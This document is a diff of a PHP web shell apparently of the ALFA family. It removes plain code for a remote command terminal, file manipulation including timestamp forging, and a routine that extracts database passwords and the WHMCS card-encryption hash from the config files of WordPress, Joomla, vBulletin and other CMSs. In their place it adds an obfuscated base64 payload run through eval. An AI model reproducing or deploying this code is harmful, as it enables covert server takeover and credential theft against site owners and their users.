-echo "<center><div style='width:500px;border: 3px solid #FFEEFF; padding: 3px; background-color: #FFDDFF;font-family: verdana; font-size: 10px'><b>cURL Error</b><br>$error</div></center>";
-die;
-}
-}
-function getConfigHtml($cms){
-$content = '';
-$cms_array = array("wp" => "WordPress", "vb" => "vBulletin", "whmcs" => "Whmcs", "joomla" => "Joomla", "phpnuke" => "PHPNuke","phpbb"=>"PHPBB","mybb"=>"MyBB","drupal"=>"Drupal","smf"=>"SMF");
-$content .= "<form class='getconfig' onSubmit='g(\"GetConfig\",null,this.cms.value,this.path.value,this.getAttribute(\"base_id\"));return false;'><div class='txtfont'>Cms: </div> <select name='cms'style='width:100px;'>";
-foreach($cms_array as $key => $val){
-$content .= "<option value='{$key}' ".($key==$cms?'selected=selected':'').">{$val}</option>";
-}
-$content .= "</select> <div class='txtfont'>Path(installed cms/Config): </div> <input type='text' name='path' value='".$_SERVER['DOCUMENT_ROOT']."/' size='30' /> <button class='button'>GetConfig</button>";
-$content .= "</form>";
-return $content;
-}
-if (!function_exists('json_encode')){
-    function json_encode($a=false){
-        if (is_null($a)) return 'null';
-        if ($a === false) return 'false';
-        if ($a === true) return 'true';
-        if (is_scalar($a))
-        {
-            if (is_float($a))
-            {
-                return floatval(str_replace(",", ".", strval($a)));
-            }
-
-            if (is_string($a))
-            {
-                static$jsonReplaces = array(array("\\", "/", "\n", "\t", "\r", "\b", "\f", '"'), array('\\\\', '\\/', '\\n', '\\t', '\\r', '\\b', '\\f', '\"'));
-                return '"' . str_replace($jsonReplaces[0], $jsonReplaces[1], $a) . '"';
-            }
-            else
-            return $a;
-        }
-        $isList = true;
-        for ($i = 0, reset($a); $i < count($a); $i++, next($a))
-        {
-            if (key($a) !== $i)
-            {
-                $isList = false;
-                break;
-            }
-        }
-        $result = array();
-        if ($isList)
-        {
-            foreach ($a as $v) $result[] = json_encode($v);
-            return '[' . join(',', $result) . ']';
-        }
-        else
-        {
-            foreach ($a as $k => $v) $result[] = json_encode($k).':'.json_encode($v);
-            return '{' . join(',', $result) . '}';
-        }
-    }
-}
-if ( !function_exists('json_decode') ){
-function json_decode($json, $array=true){
-    $comment = false;
-    $out = '$x=';
-    for ($i=0; $i<strlen($json); $i++)
-    {
-        if (!$comment)
-        {
-            if ($json[$i] == '{' || $json[$i] == '['){$out .= ' array(';}
-            else if ($json[$i] == '}' || $json[$i] == ']'){$out .= ')';}
-            else if ($json[$i] == ':'){$out .= '=>';}
-            else {$out .= $json[$i];}
-        }
-        else $out .= $json[$i];
-        if ($json[$i] == '"')    $comment = !$comment;
-    }
-    eval($out . ';');
-    return $x;
-}
-}
-function alfaterminalExec(){
-	$pwd = "pwd";
-	$seperator = ";";
-	if($GLOBALS['sys']!='unix'){
-		$pwd = "cd";
-		$seperator = "&";
-	}
-	if($GLOBALS["glob_chdir_false"]&&!empty($_POST["c"])){$cmd = "cd '".addslashes($_POST["c"])."'".$seperator;}
-	$current_path = '';
-	if(preg_match("/cd[ ]{0,}(.*)[ ]{0,}".$seperator."|cd[ ]{0,}(.*)[ ]{0,}/i", $_POST['alfa1'], $match)){
-		if(empty($match[1])){
-			$match[1] = $match[2];
-		}
-		$current_path = alfaEx("cd ".addslashes($match[1]).$seperator.$pwd);
-		$current_path = str_replace("\\", "/", $current_path);
-	}
-	$out = alfaEx($cmd.$_POST['alfa1'], true);
-	$out = htmlspecialchars($out);
-	echo json_encode(array("output" => convertBash($out), "path" => $current_path));
-}
-function convertBash($code) {
-    $dictionary = array(
-        '[01;30m' => '<span style="color:black">',
-        '[01;31m' => '<span style="color:red">',
-        '[01;32m' => '<span style="color:green">',
-        '[01;33m' => '<span style="color:yellow">',
-        '[01;34m' => '<span style="color:blue">',
-        '[01;35m' => '<span style="color:purple">',
-        '[01;36m' => '<span style="color:cyan">',
-        '[01;37m' => '<span style="color:white">',
-        '[0m'   => '</span>'
-    );
-    $htmlString = str_replace(array_keys($dictionary), $dictionary, $code);
-    return $htmlString;
-}
-function alfadoActions(){
-	$chdir_fals = false;
-	if(!@chdir($_POST['c'])){
-		$chdir_fals = true;
-		$alfa_canruncmd = _alfa_can_runCommand(true,true);
-	}
-	if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
-	if(isset($_POST['alfa2']))$_POST['alfa2'] = rawurldecode($_POST['alfa2']);
-	$action = $_POST["alfa3"];
-	if($action == "permission"){
-		$perms = 0;
-		$perm = $_POST["alfa2"];
-		for($i=strlen($perm)-1;$i>=0;--$i){
-			$perms += (int)$perm[$i]*pow(8, (strlen($perm)-$i-1));
-		}
-		if(@chmod($_POST['alfa1'], $perms)){
-			echo("done");
-		}else{
-			echo("no");
-		}
-		return;
-	}
-	if($action == "rename" || $action == "move"){
-		$alfa1_decoded = $_POST['alfa1'];
-		if($chdir_fals){
-			$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
-		}
-		$_POST['alfa1'] = trim($_POST['alfa1']);
-		$alfa1_escape = addslashes($_POST["alfa1"]);
-		if($_POST["alfa3"] == "rename"){
-			$_POST['alfa2'] = basename($_POST['alfa2']);
-		}
-		if(!empty($_POST['alfa2'])){
-			$cmd_rename = false;
-			if($chdir_fals&&$alfa_canruncmd){
-				if(_alfa_is_writable($_POST['alfa1'])){
-					$cmd_rename = true;
-					$alfa1_escape = addslashes($alfa1_decoded);
-					alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa2'])."'");
-				}
-			}
-			if(!file_exists($_POST['alfa2'])){
-				if(@rename($_POST['alfa1'], $_POST['alfa2'])||$cmd_rename){
-					echo "done";
-				}else{
-					echo "no";
-				}
-			}else{
-				echo "no";
-			}
-		}
-	}elseif($action == "copy"){
-		if(is_dir($_POST["alfa1"])){
-			$dir = str_replace('//', '/', $_POST["alfa1"]);
-			$dir = explode('/', $dir);
-			if(empty($dir[count($dir) - 1])){
-				$name = $dir[count($dir) - 2];
-			}else{
-				$name = $dir[count($dir) - 1];
-			}
-		}else{
-			$name = basename($_POST["alfa1"]);
-		}
-		$dir = dirname($_POST["alfa1"]);
-		if($dir == "."){
-			$dir = $_POST["c"]."/";
-		}
-		if(is_file($_POST["alfa1"])){
-			@copy($_POST["alfa1"], $_POST["alfa2"]);
-			echo("done");
-		}elseif(is_dir($_POST["alfa1"])){
-			if(!is_dir($_POST["alfa2"])){
-				mkdir($_POST["alfa2"], 0755, true);
-			}
-			copy_paste($dir, $name , $_POST["alfa2"] . "/");
-			echo("done");
-		}
-	}elseif($action == "modify"){
-		if( !empty($_POST['alfa1']) ) {
-			$time = strtotime($_POST['alfa1']);
-			if($time){
-				$touched = false;
-				if($chdir_fals&&$alfa_canruncmd){
-					alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa1']))."' '".addslashes($_POST['alfa2'])."'");
-					$touched = true;
-				}
-				if(!@touch($_POST['alfa2'],$time,$time)&&!$touched){
-					echo 'no';
-				}else{
-					echo 'ok';
-				}
-			} else{
-				 echo 'badtime';
-			}
-		}
-	}
-
-}
-function alfaget_flags(){
-	$flags = array();
-	if(function_exists("curl_version")){
-		$curl = new AlfaCURL();
-		$server_addr = (!@$_SERVER["SERVER_ADDR"]?(function_exists("gethostbyname")?@gethostbyname($_SERVER['SERVER_NAME']):'????'):@$_SERVER["SERVER_ADDR"]);
-		$flag = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $server_addr);
-		$flag2 = $curl->Send("http://www.geoplugin.net/json.gp?ip=" . $_SERVER["REMOTE_ADDR"]);
-		if(strpos($flag2, "geoplugin") != false){
-			$flag = json_decode($flag, true);
-			$flag2 = json_decode($flag2, true);
-			if(!empty($flag['geoplugin_countryCode'])){
-				$flags["server"]["name"] = $flag['geoplugin_countryName'];
-				$flags["server"]["code"] = $flag['geoplugin_countryCode'];
-			}
-			if(!empty($flag2['geoplugin_countryCode'])){
-				$flags["client"]["name"] = $flag2['geoplugin_countryName'];
-				$flags["client"]["code"] = $flag2['geoplugin_countryCode'];
-			}
-		}
-	}
-	echo json_encode($flags);
-}
-function alfaGetConfig(){
-$cms = $_POST['alfa1'];
-$path = trim($_POST['alfa2']);
-$config = array(
-'wp'=>array('file'=>'/wp-config.php',
-'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOST(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_NAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USER(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'prefix'=>array("/table_prefix[ ]{0,}=[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,};/",1)
-),
-'drupal'=>array('file'=>'/config.php',
-'host'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_HOSTNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'dbname'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_DATABASE(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'dbuser'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_USERNAME(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'dbpw'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PASSWORD(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1),
-'prefix'=>array("/define[ ]{0,}\([ ]{0,}(?:'|\")DB_PREFIX(?:'|\")[ ]{0,},[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,}\)[ ]{0,};/",1)
-),
-'drupal2'=>array('file'=>'/sites/default/settings.php',
-'host'=>array("/(?:'|\")host(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
-'dbname'=>array("/(?:'|\")database(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
-'dbuser'=>array("/(?:'|\")username(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
-'dbpw'=>array("/(?:'|\")password(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1),
-'prefix'=>array("/(?:'|\")prefix(?:'|\")[ ]{0,}=>[ ]{0,}(?:'|\")(.*?)(?:'|\")[ ]{0,},/",1)
-),
-'vb'=>array('file'=>'/includes/config.php',
-'host'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")servername(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
-'dbuser'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")username(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
-'dbname'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")dbname(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
-'dbpw'=>array("/config\[(?:'|\")MasterServer(?:'|\")\]\[(?:'|\")password(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3),
-'prefix'=>array("/config\[(?:'|\")Database(?:'|\")\]\[(?:'|\")tableprefix(?:'|\")\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\")[ ]{0,};/",3)
-),
-'phpnuke'=>array('file'=>'/config.php',
-'host'=>array('/dbhost(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
-'dbname'=>array('/dbname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
-'dbuser'=>array('/dbuname(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
-'dbpw'=>array('/dbpass(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3),
-'prefix'=>array('/prefix(\s+)=(\s+)(?:\'|")(.*?)(?:\'|");/',3)
-),
-'smf'=>array('file'=>'/Settings.php',
-'host'=>array("/db_server(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbuser'=>array("/db_user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbpw'=>array("/db_passwd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'prefix'=>array("/db_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
-),
-'whmcs'=>array('file'=>'/configuration.php',
-'host'=>array("/db_host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbname'=>array("/db_name(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbuser'=>array("/db_username(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbpw'=>array("/db_password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'cc_encryption_hash'=>array("/cc_encryption_hash(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
-),
-'joomla'=>array('file'=>'/configuration.php',
-'host'=>array("/\\\$host(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbname'=>array("/\\\$db(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbuser'=>array("/\\\$user(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbpw'=>array("/\\\$password(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'prefix'=>array("/\\\$dbprefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
-),
-'phpbb'=>array('file'=>'/config.php',
-'host'=>array("/dbhost(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbname'=>array("/dbname(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbuser'=>array("/dbuser(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbpw'=>array("/dbpasswd(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'prefix'=>array("/table_prefix(\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
-),
-'mybb'=>array('file'=>'/inc/config.php',
-'host'=>array("/config\['database'\]\['hostname'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbname'=>array("/config\['database'\]\['database'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbuser'=>array("/config\['database'\]\['username'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'dbpw'=>array("/config\['database'\]\['password'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3),
-'prefix'=>array("/config\['database'\]\['table_prefix'\](\s+)=(\s+)(?:'|\")(.*?)(?:'|\");/",3)
-)
-);
-if($cms == "drupal"){
-	$file = $config[$cms]['file'];
-	$file=$path.$file;
-	if(@is_file($file)||_alfa_is_dir($file,"-e")){
-	}else{
-		$cms = 'drupal2';
-	}
-}
-if($cms == "vb"){
-	$file = $config[$cms]['file'];
-	$file=$path.$file;
-	if(@is_file($file)||_alfa_is_dir($file,"-e")){
-	}else{
-		$path .= '/core';
-	}
-}
-$data = array();
-$srch_host = $config[$cms]['host'][0];
-$srch_user = $config[$cms]['dbuser'][0];
-$srch_name = $config[$cms]['dbname'][0];
-$srch_pw = $config[$cms]['dbpw'][0];
-$prefix = $config[$cms]['prefix'][0];
-$file = $config[$cms]['file'];
-$chost = $config[$cms]['host'][1];
-$cuser = $config[$cms]['dbuser'][1];
-$cname = $config[$cms]['dbname'][1];
-$cpw = $config[$cms]['dbpw'][1];
-$cprefix = $config[$cms]['prefix'][1];
-if(@is_dir($path)||_alfa_is_dir($path)){
-$file=$path.$file;
-}elseif(@is_file($path)||_alfa_is_dir($path,"-e")){
-$file=$path;
-}else{
-return false;
-}
-$file = __read_file($file);
-if($cms == "drupal2"){
-	$file = preg_replace("/\@code(.*?)\@endcode/s", "", $file);
-}elseif($cms == "vb"){
-	$file = preg_replace("/right of the(.*?)BAD!/s", "", $file);
-}
-if(preg_match($srch_host, $file, $mach)){
-$data['host'] = $mach[$chost];
-}
-if(preg_match($srch_user, $file, $mach)){
-$data['user'] = $mach[$cuser];
-}
-if(preg_match($srch_name, $file, $mach)){
-$data['dbname'] = $mach[$cname];
-}
-if(preg_match($srch_pw, $file, $mach)){
-$data['password'] = $mach[$cpw];
-}
-if(isset($prefix)){
-if(preg_match($prefix, $file, $mach)){
-$data['prefix'] = $mach[$cprefix];
-}
-}
-if($cms=='whmcs'){
-if(preg_match($config[$cms]['cc_encryption_hash'][0], $file, $mach)){
-$data['cc_encryption_hash'] = $mach[3];
-}
-}
-echo json_encode($data);
-}
-if(empty($_POST['a']))
-if(isset($default_action) && function_exists('alfa' . $default_action))
-$_POST['a'] = $default_action;
-else
-$_POST['a'] = 'FilesMan2';//'FilesMan';
-if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
-call_user_func('alfa' . $_POST['a']);
-exit;
+/*
+Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
+This code was created on Wednesday, December 6th, 2017 at 0:17 UTC from IP 46.101.219.179
+Checksum: a5e58842de641319c4c7f3ed4247a9a2edb5a3c1
+*/
+$k8fd7c3f="\x62\141\163\x65\x36\64\137\144\x65\143\157\x64\145";@eval($k8fd7c3f(
+"Ly9OTmhOOVUrVHQySkVmR1VRK1ZVbkZUemZIcklabm1xbWZsaFBIc3p6SGVQMWgyMGNPU2dNWGVKN0p
+6ME5sZDJKSUNOU0YyMmRtaUIrZmM2L2tUSmpyWWUwbEJqNFgySXE3L3hhdVBCN29oZVAzNC9FMUxUdUN
+YaThOMUx3RUt3aEwxbzBkUzY5cmpFOW03dmxWMERoYkh3cTNHeEN3b2twbk5mKzJsd2J6aXdHZk9iclp
+UMEtuTitHbEQrMGNMdjRDNlFMNCsxVFBmRC9GZUVsL1JPYkJDM0FVQ0wvZjMvL2txRE5zenVMbkVGamp
+oNEwxQUxCVTRzY2FncGxQcVlpb2djYWVEWWxmanhxTlZ4d0dZVURETnppbW1PRVBkMkRkNjZkNHdLdXR
+SclBQWXFLQThEOEhnekswNHZBQmczdUhJbDd5bW40SWZ0cG9QTFJzUUJrbTdkUVZ6dGplQ0l2NmpUdzA
+3NXQ3REgxN1gyek0xZmM3emt0TUV6ZXZRTkNiaHZGajdQMkF5cnpVTFUzdDJxMDdlaGZFYUtLL3VlRyt
+BdkVGbzhlZDFLclJPSXFuYmtGUVFhZkMwNmFtcHJqMnU4QnBNdDg0NytEbldnT0ZKSkZQMTI3UlpCL0x
+HQkpHdnlUcjVDRTNhblpQNlpFaWx4K1Viczl6cmVPdFl4SGhJZFRHbWVwNjdvbTJkL0dOMmdCeWdEcUh
+WVWsxa1JLU1NpenRHZTBwVDNmVFRWcVNUWXFpZ2V5N0F2Ukx6VVRZajBWVXYxUFhhNmdjQ2JuOHJ1eUo
+1ZWRZSmlGWTBYSTVtMTJNRS9YcUdJNXZBMXliSnp4dzNmSkoyVkVYc1JpMWlaOXY4VGE3dzliK0pZWUw
+wNnRXMkxzOWdvcG9KWVRob21iQWYvYlRWTFhnTDcwUUlLYTBmcEx2aGk5ZTA0ZnVVVGdoZHl5TUVsNXR
+ObS9wSTdmWjFZVjgzSEZHbGpMcFlnSW16dzJlUkJsMWtFMVd6ZUJseC9ReTYrT1BwTm9LemdXUXlTeWI
+2MU04YURkdG5xNDdPbjNQU1B4MDFBWVltZnZRMjhrR3A4dXlCQzhkY0Z4YUFiK2VrcUdOdVZkOVRTUXV
+xbDNvdlkrV1cvRGFlVkJ4TzhKSjBIR3ZvUUNWNkZ5dTVGRGdjWUdjeTA1UWFKeUFFZEtCWW1RVXVMZGZ
+vdnVkYUJLejVUZ2pNMDF4ekJKL3JxWm5JeXJYSER1VUVXVWluV3BCVU0zZ1U2ZkR1ZGE5Y1A2TVlmOHE
+vNkt3Q0xYemFsMXhldmdqUjArRTJCRGUrMlBpdlI4SXZkbnBNNDhKekQ5cUE2OHh6QXJFT2cyTVh1cGd
+1OVdybk9URXlPSlVYZS9WWGZJcGRaeGpmMk5lTnRUNjhaYUZFUkU1TnF6SFBacmcxYWNhTkY1L0NlUTk
+5ajV3aTVpazZYWXY3QmRiTmZOR0RzN0N2Z1hwYXE2QTVVR2JNVVFFTXlESE9PdEI5czcyRStMall0Ylc
+2QzlkemR6QTVUTDRLNDhib0tiM1NPY2NmQVZzaHN1eEhmb2ZzKzdpSDB3MWc1SXg4ZmdYQ0NOMnhNZ28
+veXpkM1JXNUxsZUlNQ2VnUy9UU3VBM0lhRUErc1RRUEorUjFLWXFCbm10VGRxb0tEN2w4dWpsczNzN0t
+IVVp6ZkFYRDBlVkUvbVhTVXZpTE9mWWVyQ1NFdGtBVkZPZjFMeTU3ak9sc3JWWlBuT0JweURBVTBPclR
+Na2NDNnRleGVOelpmdWhOamtvMGJZZm5Eay9QeFMvWVpBbTBXU3BPWnhWVUsrZEl4OUpaOXVMc0FhUnN
+tMmdsTDk1emcwQUM3LzFrUUhoY3JOcVkzbHl6MFA1RWlYMDN6b3o3QnV5YVlmVFRMLzF2c1E0WXpydks
+4RTYxQjA3QW9MTGVhRVRCdzJXczlUTkFpRTl6ZlZlcCtGMVpkWUZzMm9NL29kZEpMZWJ1T2NUVTE3WEV
+tbUZ3TlVNTlZiS3o5dTFmTm1pYTFvSEhwVUlOeHY4bm5OaThnM2daSmJCcEo1NjZZT1g2cVFYeVB0ZFF
+uSEc1YW1YTE9wQTFjVldvSW8vK2NGNzYyWjJFTDhJQ2Uxb1A4Y1F5bHFuUUNncUlwVzJxREErVU45Tkc
+xU3gxMEFDMWwzRGVXREJkSklXdGl4cGRuQ3VMeUdFYS9ENXV6UUZGck0zMDE1VW1zTTdRSlFMYlZXWS9
+ndFBwZmU4RG5semErRFlXUHBWV0RhNkRFL0F1Tng3WEhVVjdoeG5hY1phd0FDZFdkeHhRN2J4TnNYdC8
+za055U1ZyanNYZkxpUHhUT1ZPNlB3akJFTDFjdC9aazZ2TzQrdjYzVUxydUVjQk0yb3FQanp3a1dEakp
+DajB2Z2lxMVVzaHN4eWdJcnQxbHNjbnFPQXNYTWkvNDBWZ2UycUpIYzdlT0J6MnpGZW9nUlNmTkMra0x
+FVTI1enZRanlpaXVVbEtoL3NtVU9GeXkvTmpUWUNmaHFYMm56NUpoTnBHQm9RMHJGMzRGYW1qRWR5c2l
+rZVdIUHlQMFIwL29icFJzL1pidCt0Mk1OQkhIVHJaNGxRYTNka0VzYlgxMUQwVmw2MEkzbEkrQWRNZHM
+5MGIxNldoYlR2c1J6OFZ0dG8wbEpiaEpKV21PalNpRGduSGNMRE8xRFlLT29lclYzOGRxVGlOU3FWMUF
+OcHBZUjUxVHFQTmhJUjdzTDUxYi9Ba2dzdUFwRlpmMVVQNEdsOWtQSjVZbHk0MUtIb0grWUQzTTQ5Mnd
+vWlNBTFZ3eGpOcUdsSmp1Y3lOamdVNHZFcG5QUjZGWndrVE5YUkhaUko3WHhuQ3NiZThicEVkMmU0Y1J
+icFplUlI1RjRCd1UrMVBwUG9WbERmWVdjeHVRYXdIakFaWXIvNVZVend2WHVyRHEwbGpiS3Rsa3E1M09
+vMWpHZksxY25jL3M5bkkxekZOQjhwRWgxK0RWbUErOXZBNUxPZW1LaUU1M3ppYUxRODFLcjhPOFZOWVN
+EVTc1VU1kZkJWUmU5bk8vK2NlS29TbytXL3F2ZGFuY00wbDhpUHZCUVd2M3ErRkQydmtrdUdKOWFOdHl
+nazErZ0FNQUhIZnQ0UUtkTFBnNWZmcm1jT3ZvY2R5b29BN3VialNlSFlJMndFaVJKTzk5cjRLdTlGaEV
+DWmtzOGI0cjJQRDdBK1VndXYxMnYwSlFCcVNJU3hZU2xYZ3FuOENZYkMzWk5vR0kxcHU5ZGtVR2k1cGt
+4SjRSRDFHSVh5Qy82ZXMrTmxGdmp0TUs5R2E1MVcrQ3Jaa3pZTUdoTWo0Sjkzd1lCU0tTdGs1SjRuSmt
+NV1ZXejIwU2JraG9uTENxazh0UnlFSlBpRGVNa3VWa0doY1lzaDI3L0kxSDhHMGxpbjNzRDFOOVc2NnF
+BZ3JFNmdUbC9xTUFFamdJZThxd3ZRYzJTZStXc1ZvRi9jenBhU2d5ckVJNENtalB2akhiNzd3dkNlMEh
+kR08wQURhN0tlTlErKzB0WjMrejBublJvOTdWclhqVzB1dXYzUThCRXltVW82TkNCNHhiejcvczlvazF
+yc25PZU9NbitXb0plckM2VmRYMmpDRnJFWG9EZ1FTWXlJY3N5S3YyRWVTb2orVUhDMVZoMnlVWmJmTVo
+ySThDNHZCdWNsN1hWdW0wamN4TzVlcWlmeUVOOERUM0xTclZ3ZHRmZ0ZBajhDWWlReElrTm1WdHZZMEZ
+ra1NWY1NLd0d4QWp6UTl2bTZlZXJzNGp1NzNTLy9vZGFGM3V1MGRFQ2VGb0k2NG53ZjQ4cldlU3hueEp
+pVGxqVVNCNGh2NklobmovR1dmNG0yUFNzL3dCejhvOHVVazdzUElNVkpsT2pmVFZ1cDlLSHA4MldhTGR
+WdUtjRmMzTEUxN2RoWDBNTWZjUGFPRHRiMDNYMVE5UkJyMEl2SUF2L1lKMGdveU9vc3Vsd3FkaGlkY1J
+rNS9HTTFQcmE2cFBEQ2NNWjZ3cmhMNXp5UDV6M3htVVY4MjV2bkw5K25YNURkWk8rWXU5ckV4cm8wam5
+NUSt2QWg0L2VoUk1PS2VQZis3bXkyWFZ0K0VqQ2FaWTRNTWg4dkZ0dzJoN3c3YzVkOXE0aDRzLzRXRjh
+YQ2hwMWo0ckRvWG9MdENZUG9LT25sV25FMVZRTThjdjhDV3kxVjQreUlNVlhmTkdYOWI4ZkxIQjdSRFp
+QVU5lVWMzQXBINDZOOXlpVFk2VnNVb1Y2dmVMS3JDZUlVN2NXVlh2aEU3a1cyV2FDdWZ0bGZ0TFBtZTR
+oRTBRUHZMS054Q0E2d0pjRlFPeVgvRkFLTk5EdEdxRFJRU0xVMi9ZUHJBZmNUQ0Q2VFJBM0RNKzhVMTZ
+hdlZxVkpZYzB6bW9BM0hoRzN5ZGF2Wm5CMUd0NWJ3aUxuTmRYbWtTcXk5OHB2R01yK0hzYkM4RVVUb1M
+wSU9vMmZ6bFhvYndnbXZSUkVMVjM4aXNxVDBJMGkvSVZDaEZpbjJSVUJpcmhaOS9kSXk3VjdPOTBzM1p
+tOWNrMld3OXJQUVVlU28zd0NGM2dab1huV1Aya3dUYnB4Qnl1Q1U4ZHZLK1ZQVUVhU3hLOFcxcDBnOUR
+WUFZUMStIb0tVOFNuOU0zbHJSeWxGeTNTL2NUWG9xdDAyOWdZd1R1RTRCZVhtRm12a1hWc2Q1Vitlbzd
+4ai85eG55WWpSMnczL2xJc1lxeDhkeUw2MDYvdWRaaVJWd1VFemtSR2VzM004UW1Jc041SENDM25leXY
+wU09yQXppeTkybmtuRnVmeGRuNE1Ld3cxYUsxZ29Db1c3cW5KUDA3VC8xbFQwNzhuU2tNL245dlBMbUd
+2TmRGSGJ4NCtPUTZncTdYWkJMVHlNVStIUjdKaWJwNEFvWTFzVzdnRnUvZko3dUt2ZzROOGN4STQxYjV
+XN1FMRGlGcW45SmtqaXhZd0xxNnNoWnZhUGFoRjhaRER2QS9DSW4vR0cyc2V6OHZ4UTJNQTZjbTVKOFZ
+tZnhDenRPdWcvVjBSSEJ5eUhGcUYxTmxHU2tEL2FDTkNPU2wvUVBHZFQ3WmVYb21OK0kzYVdsYUY3S3R
+TZXhhek93NXdRREdpdWdyWFhvdEErVEFsYTNWZDRSTkE3OHg4VlNUZ2h0MHh4OTJrV2xuamR4SXNiNWV
+LMWtUaTRZUTZhbTAwT21rM0twTjZNbVo1VXcxc09SZkplTnljdHdFbURuY3o0M0wvejc0aGFjK1kzVWJ
+GV0VtVnRlZHdxblNzSW1OamRCRmtMazhUc3NHMG5ReHhwcDU4VmZ3Zk1jRjEraFE5TzZXMHdmbnZlR3Z
+oR2VMY1N2ZUJNSjNUNVdZek1BOU4wTHo1Z1c1Um5HVXpXRjFGWUtxdXVyblBCMjVDZldtYXJwME0vUWZ
+XM2h4RkFjVTNNbDF3Zkd1SmhaT29UanNjRjE3ZmZxV25tK3hTWXdKSmR2REZJZkduTjhIQXM5ME1wNGF
+1bEEvc1dQSUtVNDI3RXQyeWpYb2VJcTRqWVpEOE9VczdDOWtNeEFRRWttcWpYQi9CWGZESUh6ZU5yVG1
+Lc1VDazFJbEpZcFFkMmdDMVdST2ZBY0pLZ3JGdk1ZR00xejlCZzNCdHcySVhYeEU2eVB1OFFRNC9uaDh
+OMkYxS1M3ZmZFSmM5N2hqZHkyby9QUDc5VmhmMkx4c0FPVXZIbTdqbVBxazh1eFhIZlYxNHA4Wm5pSDl
